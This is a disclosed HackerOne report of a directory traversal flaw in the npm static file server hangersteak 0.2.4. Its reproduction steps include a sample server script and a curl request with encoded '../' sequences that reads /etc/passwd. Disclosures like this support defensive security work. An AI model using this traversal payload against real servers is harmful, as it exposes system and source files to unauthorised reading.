# [hangersteak] Web Server Directory Traversal via Crafted GET Request

## Report Details
- **Report ID**: 790873
- **URL**: https://hackerone.com/reports/790873
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-02-07T20:51:40.259Z
- **Disclosed**: 2020-08-30T15:56:12.642Z

## Reporter
- **Username**: bp0lr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report path traversal in hangersteak module.
It allows an attacker to read system files via path traversal local/remote

# Module

**module name:** hangersteak
**version:** 0.2.4 (latest)
**npm page:** `https://www.npmjs.com/package/hangersteak`

## Module Description

Node web static files server with built in compression support.

## Module Stats

downloads in the last year 1,684

# Vulnerability

## Vulnerability Description

Directory traversal through the url which doesn't verify the file is from the root directory path.

## Steps To Reproduce:

1 npm install hangersteak
2 create index.js with content

```const http = require('http')
const hangersteak = require('hangersteak')
const server = http.createServer((req, res) => { hangersteak(req, res) })
server.listen(3006)```

3 start the aplication `nodejs index.js`
4 `curl "http://localhost:3006/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"`

it will list the content of /etc/passwd

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N] 

thanks!

## Impact

An attacker can leverage this vulnerability to request arbitrary files from the target host, which may include application source code or system files.
The package by default listen to 0.0.0.0 enabling external access.

## Attachments
No attachments
